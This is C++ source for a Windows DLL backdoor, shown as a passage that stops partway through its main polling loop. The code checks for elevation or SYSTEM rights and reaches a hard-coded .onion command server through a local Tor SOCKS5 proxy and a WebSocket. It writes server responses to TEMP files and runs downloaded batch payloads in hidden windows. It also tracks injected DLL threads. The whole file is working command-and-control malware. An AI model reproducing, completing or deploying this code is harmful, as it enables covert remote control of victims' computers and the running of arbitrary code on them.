#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>
#include <vector>
#include <stdexcept>
#include <ctime>
#include <tuple>
#include <cstdio>
#include <cstdlib>
#include <algorithm>
#include <sddl.h>
#include <utility>
#include <unordered_map>
#include <cstring>
#include <cstdint>
#include <functional>
#include <random>


#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "User32.lib")

//compile with: cl /EHsc /LD /std:c++17 inject.cpp Advapi32.lib ws2_32.lib user32.lib

std::string getProcessName() {
    char processName[MAX_PATH] = { 0 };
    GetModuleFileNameA(NULL, processName, MAX_PATH);

    char* filename = strrchr(processName, '\\');
    if (filename) filename++;
    else filename = processName;

    return std::string(filename);
}

bool IsProcessElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return false;
    }

    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    bool isElevated = false;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        // TokenIsElevated != 0 means the process is running elevated
        isElevated = (elevation.TokenIsElevated != 0);
    }

    CloseHandle(hToken);
    return isElevated;
}


// New helper to check elevation and SYSTEM
std::string getProcessNameWithElevation() {
    std::string name = getProcessName();

    // 1) Check UAC elevation
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return name + ", error";
    }

    TOKEN_ELEVATION elevation;
    DWORD dwSize = 0;
    BOOL isElevated = FALSE;

    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        isElevated = elevation.TokenIsElevated;
    }

    // 2) Check if SYSTEM
    // Query the token user SID
    DWORD dwLength = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLength);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwLength);
    BOOL isSystem = FALSE;

    if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwSize)) {
        LPSTR sidString = nullptr;
        if (ConvertSidToStringSidA(pTokenUser->User.Sid, &sidString)) {
            // SYSTEM account SID is "S-1-5-18"
            if (strcmp(sidString, "S-1-5-18") == 0) {
                isSystem = TRUE;
            }
            LocalFree(sidString);
        }
    }
    if (pTokenUser) free(pTokenUser);

    CloseHandle(hToken);

    // 3) Format result
    if (isSystem) {
        return name + ", system";
    }
    else if (isElevated) {
        return name + ", elevated";
    }
    else {
        return name + ", not elevated";
    }
}


void write_file(const std::string& path, const std::string& content) {
    std::ofstream f(path, std::ios::binary);
    f << content;
}
void clear_file(const std::string& path) {
    std::ofstream f(path, std::ios::trunc | std::ios::binary);
}

std::string timestamp() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[64];
    sprintf_s(buf, "%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);
    return buf;
}

// ------------------------------------------------------
// Logging helper – ANSI text
// ------------------------------------------------------
void log_append(const std::string& logfile, const std::string& txt) {
    std::ofstream f(logfile, std::ios::app | std::ios::binary);
    if (!f) return;
    f << "[" << timestamp() << "] " << txt << "\r\n";
}



void close_socket(SOCKET s) {
    if (s != INVALID_SOCKET) {
        shutdown(s, SD_BOTH);
        closesocket(s);
    }
}

SOCKET socks5_connect(const char* proxy_ip, int proxy_port, const char* host, int port) {
    WSADATA w{};
    if (WSAStartup(MAKEWORD(2, 2), &w) != 0) {
        std::cerr << "[!] WSAStartup failed\n";
        return INVALID_SOCKET;
    }

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        std::cerr << "[!] socket() failed\n";
        WSACleanup();
        return INVALID_SOCKET;
    }

    sockaddr_in proxy_addr{};
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons((unsigned short)proxy_port);
    inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr);

    if (connect(s, (sockaddr*)&proxy_addr, sizeof(proxy_addr)) != 0) {
        std::cerr << "[!] connect() to SOCKS5 proxy failed\n";
        closesocket(s);
        WSACleanup();
        return INVALID_SOCKET;
    }

    std::cout << "[*] Connected to SOCKS5 proxy\n";

    // Greeting
    unsigned char greet[3] = { 0x05, 0x01, 0x00 };
    if (send(s, (char*)greet, 3, 0) != 3) {
        std::cerr << "[!] SOCKS5 send greeting failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    unsigned char resp[2];
    if (recv(s, (char*)resp, 2, 0) != 2) {
        std::cerr << "[!] SOCKS5 greeting response failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    std::cout << "[*] SOCKS5 greeting response: "
        << std::hex << (int)resp[0] << " " << (int)resp[1] << "\n";

    if (resp[1] != 0x00) {
        std::cerr << "[!] SOCKS5 no acceptable auth\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    // CONNECT request using domain name
    std::string hostStr(host);
    std::vector<unsigned char> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((unsigned char)hostStr.size());
    req.insert(req.end(), hostStr.begin(), hostStr.end());
    req.push_back((unsigned char)((port >> 8) & 0xFF));
    req.push_back((unsigned char)(port & 0xFF));

    if (send(s, (char*)req.data(), (int)req.size(), 0) != (int)req.size()) {
        std::cerr << "[!] SOCKS5 CONNECT send failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    std::cout << "[*] Sent SOCKS5 CONNECT for " << host << ":" << port << "\n";

    // Read response
    unsigned char baseRep[4];
    if (recv(s, (char*)baseRep, 4, 0) != 4) {
        std::cerr << "[!] SOCKS5 CONNECT response failed\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }
    if (baseRep[1] != 0x00) {
        std::cerr << "[!] SOCKS5 CONNECT rejected, reply=" << std::hex << (int)baseRep[1] << "\n";
        close_socket(s); WSACleanup(); return INVALID_SOCKET;
    }

    std::cout << "[*] SOCKS5 CONNECT succeeded\n";

    // consume remaining bytes depending on ATYP
    unsigned char atyp = baseRep[3];
    int remaining = 0;
    if (atyp == 0x01) remaining = 6;
    else if (atyp == 0x03) {
        unsigned char lenb;
        if (recv(s, (char*)&lenb, 1, 0) != 1) { close_socket(s); WSACleanup(); return INVALID_SOCKET; }
        remaining = lenb + 2;
    }
    else if (atyp == 0x04) remaining = 18;

    if (remaining > 0) {
        std::vector<unsigned char> tmp(remaining);
        if (recv(s, (char*)tmp.data(), remaining, 0) != remaining) { close_socket(s); WSACleanup(); return INVALID_SOCKET; }
    }

    std::cout << "[*] SOCKS5 CONNECT completed\n";

    return s;
}

bool do_websocket_handshake(SOCKET s, const std::string& hostHeader, const std::string& resource, std::string& out_key) {
    out_key = "TESTKEY12345678"; // or generate_ws_key()
    std::ostringstream hdr;
    hdr << "GET " << resource << " HTTP/1.1\r\n";
    hdr << "Host: " << hostHeader << "\r\n";
    hdr << "Upgrade: websocket\r\n";
    hdr << "Connection: Upgrade\r\n";
    hdr << "Sec-WebSocket-Key: " << out_key << "\r\n";
    hdr << "Sec-WebSocket-Version: 13\r\n";
    hdr << "\r\n";

    std::string req = hdr.str();
    std::cout << "[*] WebSocket handshake request:\n" << req << "\n";

    if (send(s, req.c_str(), (int)req.size(), 0) != (int)req.size()) {
        std::cerr << "[!] WebSocket handshake send failed\n";
        close_socket(s); return false;
    }

    std::string resp;
    char buf[1024];
    int n;
    while (true) {
        n = recv(s, buf, sizeof(buf), 0);
        if (n <= 0) { close_socket(s); std::cerr << "[!] WebSocket handshake recv failed\n"; return false; }
        resp.append(buf, buf + n);
        if (resp.find("\r\n\r\n") != std::string::npos) break;
    }

    std::cout << "[*] WebSocket handshake response:\n" << resp << "\n";

    if (resp.find("HTTP/1.1 101") == std::string::npos && resp.find("HTTP/1.0 101") == std::string::npos) {
        std::cerr << "[!] WebSocket handshake failed\n";
        close_socket(s); return false;
    }

    return true;
}

static std::wstring string_to_wstring(const std::string& s)
{
    if (s.empty()) return L"";

    int len = MultiByteToWideChar(
        CP_UTF8,
        0,
        s.data(),
        (int)s.size(),
        nullptr,
        0
    );

    std::wstring out(len, L'\0');

    MultiByteToWideChar(
        CP_UTF8,
        0,
        s.data(),
        (int)s.size(),
        out.data(),
        len
    );

    return out;
}

bool send_over_socket(SOCKET s, const std::vector<unsigned char>& data);

SOCKET upgrade(const char* proxy_ip, int proxy_port, const char* host, int port, const char* resource) {
    SOCKET s = socks5_connect(proxy_ip, proxy_port, host, port);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    std::string hostHeader = host;
    if (strstr(host, ".onion") == nullptr && port != 80 && port != 443) {
        hostHeader += ":" + std::to_string(port);
    }

    std::string key;
    if (!do_websocket_handshake(s, hostHeader, resource, key)) {
        closesocket(s); WSACleanup();
        return INVALID_SOCKET;
    }

    std::cout << "[*] WebSocket upgraded successfully\n";
    std::string datastr = "__CLIENT_CONN__";
    std::vector<unsigned char> data = std::vector<unsigned char>(datastr.begin(), datastr.end());
    if (!send_over_socket(s, data)) {
        closesocket(s); WSACleanup();
        return INVALID_SOCKET;
    }
    return s;
}

bool send_over_socket(SOCKET s, const std::vector<unsigned char>& data) {
    if (s == INVALID_SOCKET) return false;

    std::vector<unsigned char> frame;
    // FIN + binary (0x82)
    frame.push_back(0x81);

    size_t len = data.size();
    if (len <= 125) {
        frame.push_back((unsigned char)(0x80 | (unsigned char)len)); // MASK bit set
    }
    else if (len <= 0xFFFF) {
        frame.push_back((unsigned char)(0x80 | 126));
        frame.push_back((unsigned char)((len >> 8) & 0xFF));
        frame.push_back((unsigned char)(len & 0xFF));
    }
    else {
        frame.push_back((unsigned char)(0x80 | 127));
        // 64-bit length network order
        for (int i = 7; i >= 0; --i) frame.push_back((unsigned char)((len >> (8 * i)) & 0xFF));
    }

    // generate 4-byte mask
    unsigned char mask[4];
    std::random_device rd;
    for (int i = 0; i < 4; ++i) mask[i] = (unsigned char)(rd() & 0xFF);
    frame.insert(frame.end(), mask, mask + 4);

    // masked payload
    for (size_t i = 0; i < len; ++i) {
        unsigned char b = data[i] ^ mask[i % 4];
        frame.push_back(b);
    }

    int sent = 0;
    int tosend = (int)frame.size();
    const char* ptr = (const char*)frame.data();
    while (sent < tosend) {
        int n = send(s, ptr + sent, tosend - sent, 0);
        if (n <= 0) return false;
        sent += n;
    }
    return true;
}

bool recv_one_frame(SOCKET ws, std::vector<unsigned char>& payload, unsigned char& opcode, const std::string& LOGFILE) {
    payload.clear();

    unsigned char hdr[2];
    int n = recv(ws, (char*)hdr, 2, 0);
    if (n != 2) {
        std::cout << "[ERROR] Failed to read WebSocket header, recv returned " << n << "\n";
        log_append(LOGFILE, "[ERROR] Failed to read WebSocket header, recv returned " + std::to_string(n));
        return false;
    }

    opcode = hdr[0] & 0x0F;
    bool fin = (hdr[0] & 0x80) != 0;
    bool masked = (hdr[1] & 0x80) != 0;
    uint64_t payload_len = hdr[1] & 0x7F;

    std::cout << "[DEBUG] Opcode: " << (int)opcode << ", FIN: " << fin << ", Masked: " << masked << ", Payload len initial: " << payload_len << "\n";
    log_append(LOGFILE, "[DEBUG] Opcode: " + std::to_string(opcode) +
        ", FIN: " + std::to_string(fin) +
        ", Masked: " + std::to_string(masked) +
        ", Payload len initial: " + std::to_string(payload_len));

    // Extended payload
    if (payload_len == 126) {
        unsigned char ext[2];
        if (recv(ws, (char*)ext, 2, 0) != 2) {
            std::cout << "[ERROR] Failed to read extended payload length (16-bit)\n";
            log_append(LOGFILE, "[ERROR] Failed to read extended payload length (16-bit)");
            return false;
        }
        payload_len = (ext[0] << 8) | ext[1];
        std::cout << "[DEBUG] Extended 16-bit payload length: " << payload_len << "\n";
        log_append(LOGFILE, "[DEBUG] Extended 16-bit payload length: " + std::to_string(payload_len));
    }
    else if (payload_len == 127) {
        unsigned char ext[8];
        if (recv(ws, (char*)ext, 8, 0) != 8) {
            std::cout << "[ERROR] Failed to read extended payload length (64-bit)\n";
            log_append(LOGFILE, "[ERROR] Failed to read extended payload length (64-bit)");
            return false;
        }
        payload_len = 0;
        for (int i = 0; i < 8; ++i)
            payload_len = (payload_len << 8) | ext[i];
        std::cout << "[DEBUG] Extended 64-bit payload length: " << payload_len << "\n";
        log_append(LOGFILE, "[DEBUG] Extended 64-bit payload length: " + std::to_string(payload_len));
    }

    // Mask
    unsigned char mask[4] = { 0 };
    if (masked) {
        if (recv(ws, (char*)mask, 4, 0) != 4) {
            std::cout << "[ERROR] Failed to read mask key\n";
            log_append(LOGFILE, "[ERROR] Failed to read mask key");
            return false;
        }
        std::cout << "[DEBUG] Mask key: " << std::hex
            << (int)mask[0] << " " << (int)mask[1] << " " << (int)mask[2] << " " << (int)mask[3] << std::dec << "\n";
        log_append(LOGFILE, "[DEBUG] Mask key: " +
            std::to_string(mask[0]) + " " +
            std::to_string(mask[1]) + " " +
            std::to_string(mask[2]) + " " +
            std::to_string(mask[3]));
    }

    // Payload
    payload.resize(payload_len);
    size_t total_read = 0;
    while (total_read < payload_len) {
        int r = recv(ws, (char*)payload.data() + total_read, (int)(payload_len - total_read), 0);
        std::cout << "[DEBUG] recv returned " << r << " bytes\n";
        if (r <= 0) {
            std::cout << "[ERROR] Failed to read payload or connection closed, recv returned " << r << "\n";
            log_append(LOGFILE, "[ERROR] Failed to read payload or connection closed, recv returned " + std::to_string(r));
            return false;
        }
        total_read += r;
        std::cout << "[DEBUG] Read " << r << " bytes, total " << total_read << "/" << payload_len << "\n";
        log_append(LOGFILE, "[DEBUG] Read " + std::to_string(r) + " bytes, total " + std::to_string(total_read) + "/" + std::to_string(payload_len));
    }

    // Unmask
    if (masked) {
        for (uint64_t i = 0; i < payload_len; ++i)
            payload[i] ^= mask[i % 4];
    }

    std::cout << "[INFO] Frame received, size: " << payload.size() << ", opcode: " << (int)opcode << "\n";
    log_append(LOGFILE, "[INFO] Frame received, size: " + std::to_string(payload.size()) + ", opcode: " + std::to_string(opcode));

    return true;
}


HANDLE startMapperFromFARPROC(FARPROC p, const std::string& url1, const std::string& url2, const std::string& mainFuncName) {
    struct ThreadArgs {
        FARPROC func;
        std::string u1, u2, mf;
    };

    auto* args = new ThreadArgs{ p, url1, url2, mainFuncName };

    auto threadProc = [](LPVOID lpParam) -> DWORD {
        std::unique_ptr<ThreadArgs> a(static_cast<ThreadArgs*>(lpParam));

        try {
            using FuncType = void(*)(const char*, const char*, const char*);
            FuncType f = reinterpret_cast<FuncType>(a->func);
            f(a->u1.c_str(), a->u2.c_str(), a->mf.c_str());
        }
        catch (...) {
            // ignore crashes in user function
        }
        return 0;
        };

    HANDLE hThread = CreateThread(
        nullptr,
        0,
        threadProc,
        args,
        0,
        nullptr
    );

    if (!hThread) {
        std::cout << "[ERROR] CreateThread failed in startMapperFromFARPROC\n";
        delete args;
    }

    return hThread;
}


HANDLE startThreadFromFARPROC(FARPROC p) {
    // Thread procedure wrapper
    auto threadProc = [](LPVOID lpParam) -> DWORD {
        FARPROC func = reinterpret_cast<FARPROC>(lpParam);
        try {
            // Cast to void(*)() and call
            auto f = reinterpret_cast<void(*)()>(func);
            f();
        }
        catch (...) {
            // silently ignore exceptions
        }
        return 0;
        };

    // Create detached thread
    HANDLE hThread = CreateThread(
        nullptr,       // default security attributes
        0,             // default stack size
        threadProc,    // thread function
        p,             // parameter: FARPROC
        0,             // run immediately
        nullptr        // ignore thread id
    );

    if (hThread) {
        return hThread; // detach thread
    }
}

std::string get_last(const std::string& s, char delim) {
    size_t pos = s.rfind(delim);
    if (pos == std::string::npos) return s;      // no delimiter found
    return s.substr(pos + 1);                    // return last segment
}

class thread_storage {
public:
    struct threadHandle {
        HANDLE hThread;
        std::string name;
        DWORD id;
        HMODULE hModule;
        bool active;
    };

    std::vector<threadHandle> threads;
    using StopFunc = int(__stdcall*)();

    void store(HANDLE hThread, std::string name, HMODULE hModule = NULL) {
        threadHandle h;
        h.hThread = hThread;
        h.name = name;
        h.id = GetThreadId(h.hThread);
        h.active = true;
        if (hModule) {
            h.hModule = hModule;
        }
        threads.push_back(h);
    }

    std::vector<std::reference_wrapper<threadHandle>> get_by_name(const std::string& name) {
        std::vector<std::reference_wrapper<threadHandle>> result;
        for (auto& t : threads) {
            if (t.name == name)
                result.push_back(t);  // store reference
        }
        return result;
    }



    threadHandle* get_by_id(DWORD id) {
        for (size_t i = 0; i < threads.size(); i++) {
            if (threads[i].id == id) {
                return &threads[i];
            }
        }
        return nullptr;
    }

    void suspend_by_name(std::string name) {
        for (size_t i = 0; i < threads.size(); i++) {
            if (threads[i].name == name && threads[i].active) {
                if (threads[i].hModule) {
                    StopFunc stop = (StopFunc)GetProcAddress(threads[i].hModule, "suspend");
                    if (stop) {
                        stop(); // call exported stop function
                    }
                }
                threads[i].active = false;
                SuspendThread(threads[i].hThread);
                return;
            }
        }
    }

    void suspend_by_id(DWORD id) {
        for (size_t i = 0; i < threads.size(); i++) {
            if (threads[i].id == id && threads[i].active) {
                if (threads[i].hModule) {
                    StopFunc stop = (StopFunc)GetProcAddress(threads[i].hModule, "suspend");
                    if (stop) {
                        stop(); // call exported stop function
                    }
                }
                threads[i].active = false;
                SuspendThread(threads[i].hThread);
                return;
            }
        }
    }

    void resume_by_name(std::string name) {
        for (size_t i = 0; i < threads.size(); i++) {
            if (threads[i].name == name && !threads[i].active) {
                if (threads[i].hModule) {
                    StopFunc stop = (StopFunc)GetProcAddress(threads[i].hModule, "resume");
                    if (stop) {
                        stop(); // call exported stop function
                    }
                }
                threads[i].active = true;
                ResumeThread(threads[i].hThread);
                return;
            }
        }
    }

    void resume_by_id(DWORD id) {
        for (size_t i = 0; i < threads.size(); i++) {
            if (threads[i].id == id && !threads[i].active) {
                if (threads[i].hModule) {
                    StopFunc stop = (StopFunc)GetProcAddress(threads[i].hModule, "resume");
                    if (stop) {
                        stop(); // call exported stop function
                    }
                }
                threads[i].active = true;
                ResumeThread(threads[i].hThread);
                return;
            }
        }
    }

    void terminate_by_name(std::string name) {
        for (size_t i = 0; i < threads.size(); i++) {
            if (threads[i].name == name) {
                if (threads[i].hModule) {
                    StopFunc stop = (StopFunc)GetProcAddress(threads[i].hModule, "stop");
                    if (stop) {
                        stop(); // call exported stop function
                    }
                }
                threads[i].active = false;
                TerminateThread(threads[i].hThread, 0);
                CloseHandle(threads[i].hThread);
                threads.erase(threads.begin() + i);
                return;
            }
        }
    }

    void terminate_by_id(DWORD id) {
        for (size_t i = 0; i < threads.size(); i++) {
            if (threads[i].id == id) {
                if (threads[i].hModule) {
                    StopFunc stop = (StopFunc)GetProcAddress(threads[i].hModule, "stop");
                    if (stop) {
                        stop(); // call exported stop function
                    }
                }
                threads[i].active = false;
                TerminateThread(threads[i].hThread, 0);
                CloseHandle(threads[i].hThread);
                threads.erase(threads.begin() + i);
                return;
            }
        }
    }
};

struct __MBParams {
    HWND hWnd;
    std::string text;
    std::string title;
    UINT type;
};

DWORD WINAPI __MBThread(LPVOID lp)
{
    __MBParams* p = (__MBParams*)lp;

    // 1. Create a hidden topmost owner window
    HWND hOwner = CreateWindowExA(
        WS_EX_TOPMOST,
        "STATIC",
        "TopMostOwner",
        WS_POPUP,
        0, 0, 0, 0,
        nullptr, nullptr, GetModuleHandle(nullptr), nullptr
    );

    if (hOwner)
        ShowWindow(hOwner, SW_HIDE);

    // 2. Show message box ALWAYS ON TOP
    MessageBoxA(
        hOwner,
        p->text.c_str(),
        p->title.c_str(),
        p->type | MB_TOPMOST
    );

    if (hOwner)
        DestroyWindow(hOwner);

    delete p;
    return 0;
}

// -----------------------------------------------------
//  DROP-IN REPLACEMENT FOR MessageBoxA (NON-BLOCKING)
// -----------------------------------------------------
void MessageBoxAsync(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
    __MBParams* p = new __MBParams();
    p->hWnd = hWnd;
    p->text = lpText ? lpText : "";
    p->title = lpCaption ? lpCaption : "";
    p->type = uType;

    // Fire-and-forget thread
    CreateThread(nullptr, 0, __MBThread, p, 0, nullptr);
}


unsigned char* dllcode = nullptr;
size_t dllsize = 0;

inline void trim_left(std::string& s) {
    s.erase(s.begin(), std::find_if(s.begin(), s.end(),
        [](unsigned char c) { return !std::isspace(c); }));
}

struct ThreadCallContext {
    FARPROC func;
    uintptr_t arg;
};

std::string NormalizePath(const std::string& base, const std::string& input)
{
    // If absolute path, return as-is
    if (input.size() >= 2 && input[1] == ':') {
        return input;
    }

    // Build a temp path
    std::string temp = base;
    if (!temp.empty() && temp.back() != '\\')
        temp += '\\';
    temp += input;

    // Use GetFullPathNameA to normalize ".." and "."
    char buffer[MAX_PATH];
    DWORD r = GetFullPathNameA(temp.c_str(), MAX_PATH, buffer, nullptr);
    if (r == 0 || r > MAX_PATH)
        return base;  // On error, keep previous path

    return std::string(buffer);
}


bool post_socks5_write_file(
    const char* proxy_ip, int proxy_port,
    const char* host, int port,
    const char* path,
    const std::vector<unsigned char>& body,
    const std::string& RESP               // <- file to write to
)
{
    WSADATA w{};
    if (WSAStartup(MAKEWORD(2, 2), &w) != 0) return false;

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return false; }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)proxy_port);
    inet_pton(AF_INET, proxy_ip, &addr.sin_addr);

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s); WSACleanup(); return false;
    }

    // SOCKS5 greeting (no auth)
    unsigned char greet[3] = { 0x05, 0x01, 0x00 };
    if (send(s, (char*)greet, 3, 0) != 3) { closesocket(s); WSACleanup(); return false; }

    unsigned char resp[2];
    if (recv(s, (char*)resp, 2, 0) != 2) { closesocket(s); WSACleanup(); return false; }
    if (resp[1] != 0x00) { closesocket(s); WSACleanup(); return false; }

    // SOCKS5 CONNECT request (domain)
    std::string hostStr(host);
    std::vector<unsigned char> req;
    req.push_back(0x05);
    req.push_back(0x01);
    req.push_back(0x00);
    req.push_back(0x03);
    req.push_back(hostStr.size());
    req.insert(req.end(), hostStr.begin(), hostStr.end());
    req.push_back((port >> 8) & 0xFF);
    req.push_back(port & 0xFF);

    if (send(s, (char*)req.data(), (int)req.size(), 0) != (int)req.size()) {
        closesocket(s); WSACleanup(); return false;
    }

    unsigned char rep2[10];
    if (recv(s, (char*)rep2, sizeof(rep2), 0) <= 1) {
        closesocket(s); WSACleanup(); return false;
    }
    if (rep2[1] != 0x00) {
        closesocket(s); WSACleanup(); return false;
    }

    // Build POST header + send
    std::string hdr;
    hdr += "POST ";
    hdr += path;
    hdr += " HTTP/1.1\r\n";
    hdr += "Host: " + hostStr + "\r\n";
    hdr += "Content-Type: application/octet-stream\r\n";
    hdr += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";

    if (send(s, hdr.c_str(), (int)hdr.size(), 0) != (int)hdr.size()) {
        closesocket(s); WSACleanup(); return false;
    }

    // send raw body
    if (!body.empty()) {
        if (send(s, (char*)body.data(), (int)body.size(), 0) != (int)body.size()) {
            closesocket(s); WSACleanup(); return false;
        }
    }

    // Read full response
    std::vector<unsigned char> data;
    unsigned char buffer[4096];
    int n;
    while ((n = recv(s, (char*)buffer, sizeof(buffer), 0)) > 0) {
        data.insert(data.end(), buffer, buffer + n);
    }

    closesocket(s);
    WSACleanup();

    // Split headers and body
    const std::string marker = "\r\n\r\n";
    auto it = std::search(data.begin(), data.end(), marker.begin(), marker.end());
    if (it == data.end()) return false;

    size_t header_len = (it - data.begin()) + marker.size();
    size_t body_len = data.size() - header_len;

    // Convert body to string (binary safe)
    std::string out((char*)&data[header_len], body_len);

    // Equivalent of: curl -o RESP
    write_file(RESP, out);

    return true;
}


// ------------------------------------------------------
// Read only the first line of a file
// ------------------------------------------------------
std::string read_first_line(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return "";
    std::string line;
    std::getline(f, line);
    return line;
}

// ------------------------------------------------------
// Read entire file (ANSI)
// ------------------------------------------------------
std::string read_file(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return "";
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

static std::string read_file_last_line(const std::string& path) {
    std::string content = read_file(path);
    if (content.empty()) return "";

    size_t pos = content.find_last_of("\r\n");
    if (pos == std::string::npos) return content; // single line
    if (pos + 1 < content.size() && content[pos] == '\r' && content[pos+1] == '\n')
        ++pos; // skip CR in CRLF

    return content.substr(pos + 1);
}

// ------------------------------------------------------
// Write ANSI file
// ------------------------------------------------------


// Safe getenv wrapper using _dupenv_s
std::string safe_getenv(const char* name) {
    char* buf = nullptr;
    size_t sz = 0;

    if (_dupenv_s(&buf, &sz, name) != 0 || buf == nullptr)
        return "";

    std::string result(buf);
    free(buf);
    return result;
}

std::string OUTFILE;

bool start_process(const char* file, bool bat = true, const char* exeArgs = nullptr)
{
    // Expand environment variables

    auto expandVars = [](const char* input) -> std::string {
        if (!input) return "";
        DWORD need = ExpandEnvironmentStringsA(input, nullptr, 0);
        if (!need) return "";
        std::vector<char> buf(need);
        ExpandEnvironmentStringsA(input, buf.data(), need);
        return std::string(buf.data());
        };


    DWORD needed = ExpandEnvironmentStringsA(file, nullptr, 0);
    if (!needed) return false;

    std::vector<char> expanded(needed);
    if (!ExpandEnvironmentStringsA(file, expanded.data(), needed))
        return false;

    std::string scriptPath = expanded.data();

    // ---- Build command line ----
    std::vector<char> cmdMutableData;
    char* cmdPtr = nullptr;

    if (bat) {
        // Batch command with output redirection
        std::string cmdLine =
            "cmd.exe /C \"\"" + scriptPath + "\" > \"" + OUTFILE + "\" 2>&1\"";

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\0');

        cmdPtr = cmdMutableData.data();
    }
    else {
        // ---- Build command line for EXE ----
        std::string cmdLine;

        // Expand args
        std::string args = expandVars(exeArgs);

        // EXE name must be first
        cmdLine = "\"" + scriptPath + "\"";

        if (!args.empty()) {
            cmdLine += " ";
            cmdLine += args;
        }

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\0');

        cmdPtr = cmdMutableData.data();
    }

    // ---- Select process name ----
    std::string processName;

    if (bat)
        processName = "C:\\Windows\\System32\\cmd.exe";
    else
        processName = scriptPath;  // Launch EXE directly

    // ---- Create process ----
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    // Key flags for elevation inheritance:
    DWORD creationFlags = CREATE_NO_WINDOW;

    BOOL ok = CreateProcessA(
        nullptr,               // lpApplicationName MUST be NULL
        cmdPtr,                // full command line
        nullptr,
        nullptr,
        FALSE,
        creationFlags,
        nullptr,
        nullptr,
        &si,
        &pi
    );


    if (!ok) {
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

std::vector<unsigned char> load_file(const std::string& f) {
    std::ifstream in(f, std::ios::binary);
    return std::vector<unsigned char>(std::istreambuf_iterator<char>(in), {});
}


// ------------------------------------------------------
// MAIN PROGRAM
// ------------------------------------------------------
extern "C" __declspec(dllexport)
int main_func()
{
    std::string procName = getProcessNameWithElevation();
    // -------------------------
    // Configuration
    // -------------------------
    //start tor
    const char* URL = "we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion";
    const char* PATH = "/cdr";
    std::string USER = safe_getenv("USERNAME");
    if (USER.empty()) USER = "unknown";
    int POLL_DELAY = 5;

    thread_storage tStorage;

    // Temp files
    std::string TEMP = safe_getenv("TEMP");
    std::string RESP = TEMP + "\\rx_resp.txt";
    std::string PAYLOAD = TEMP + "\\rx_payload.bat";
    std::string UNINSTALLER = TEMP + "\\rx_uninstall.bat";

    std::string WORKINGDIR = "";

    std::unordered_map<std::string, HMODULE> loadedDLLs;

    const int MAX_UPGRADE_TRIES = 10;

    char PAYLOADCHAR[512] = { 0 };  // adjust size as needed
    strncpy_s(PAYLOADCHAR, sizeof(PAYLOADCHAR), PAYLOAD.c_str(), _TRUNCATE);

    OUTFILE = TEMP + "\\rx_out.txt";
    std::string SENDRES = TEMP + "\\rx_send_result.txt";
    std::string LOGFILE = TEMP + "\\receiver_log.txt";

    bool upgradeToWebSocket = false;
    bool webSocket = false;

    // Clean old files
    clear_file(RESP.c_str());
    clear_file(PAYLOAD.c_str());
    clear_file(OUTFILE.c_str());
    clear_file(SENDRES.c_str());
    DeleteFileA(RESP.c_str());
    DeleteFileA(PAYLOAD.c_str());
    DeleteFileA(OUTFILE.c_str());
    DeleteFileA(SENDRES.c_str());

    log_append(LOGFILE, "[INFO] Starting safe C++ receiver version");
    log_append(LOGFILE, "[INFO] Log file: " + LOGFILE);

    SOCKET ws;
    HANDLE hMutex = NULL;

    bool elevated = IsProcessElevated();

    if (elevated) {
        USER = USER + "$";
    }

    // MAIN LOOP
    bool executepayload = true;
    for (;;) {
        log_append(LOGFILE, "----------------------------------------------------");
        log_append(LOGFILE, "[INFO] LOOP START");

        int tries = 0;
        while (upgradeToWebSocket && tries <= MAX_UPGRADE_TRIES) {
            ws = upgrade("127.0.0.1", 9050, URL, 8576, "/ws");
            if (ws == INVALID_SOCKET) {
                std::cout << "Failed to initialize WebSocket, trying " << (MAX_UPGRADE_TRIES - tries) << " more times...\n";
                log_append(LOGFILE, "[WARN] Failed to initialize WebSocket");
                webSocket = false;
                tries++;
                Sleep(2000);
            }
            else {
                upgradeToWebSocket = false;
            }
        }

